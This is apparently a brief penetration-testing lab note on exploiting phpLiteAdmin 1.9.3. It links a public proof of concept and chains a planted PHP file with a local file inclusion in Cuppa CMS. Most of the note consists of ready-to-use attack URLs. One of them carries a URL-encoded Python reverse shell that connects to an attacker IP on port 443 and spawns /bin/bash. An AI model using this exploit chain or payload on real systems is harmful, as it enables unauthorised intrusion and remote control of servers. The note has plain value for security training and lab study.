<https://github.com/F-Masood/PHPLiteAdmin-1.9.3---Exploit-PoC>
phpliteadmin exploit with lfi to revshell


Follow this, but test with both text and string, and adjust the url potentially. 
In this particular case, the way to trigger the malicous file you created through phpliteadmin, was through Cuppa CMS like so:
<http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../usr/local/databases/poc.php>

and reverse shell, like so:  
<http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../usr/local/databases/poc.php&cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.119.199%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27>

